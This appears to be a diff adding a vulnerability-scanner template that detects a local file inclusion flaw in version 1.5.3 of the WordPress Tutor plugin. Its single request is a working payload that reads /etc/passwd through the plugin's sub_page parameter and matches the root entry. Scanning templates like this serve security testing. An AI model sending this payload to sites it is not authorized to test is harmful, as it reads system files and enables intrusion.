@@ -1,0 +1,17 @@
+id: wp-tutor-lfi
+info:
+  author: 0x240x23elu
+  name: WordPress Plugin tutor.1.5.3 - Local File Inclusion
+  reference:
+  - https://www.exploit-db.com/exploits/48058
+  severity: high
+  tags: wordpress,wp-plugin,lfi
+requests:
+- matchers:
+  - part: body
+    regex:
+    - 'root:.*:0:0:'
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd'
